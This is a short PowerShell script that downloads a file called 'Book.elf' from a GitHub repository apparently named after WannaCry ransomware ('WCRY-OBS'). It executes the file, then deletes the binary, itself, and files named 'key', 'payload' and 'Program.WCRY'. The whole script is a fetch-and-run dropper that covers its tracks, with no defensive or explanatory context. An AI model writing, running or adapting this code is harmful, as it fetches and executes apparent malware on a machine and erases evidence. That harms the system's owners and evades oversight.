$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Book.elf'
wget -Uri $url
$scriptName = $MyInvocation.MyCommand.Name
./Book.elf
Remove-Item "Book.elf"
Remove-Item $scriptName
Remove-Item "key"
Remove-Item "payload"
Remove-Item "Program.WCRY"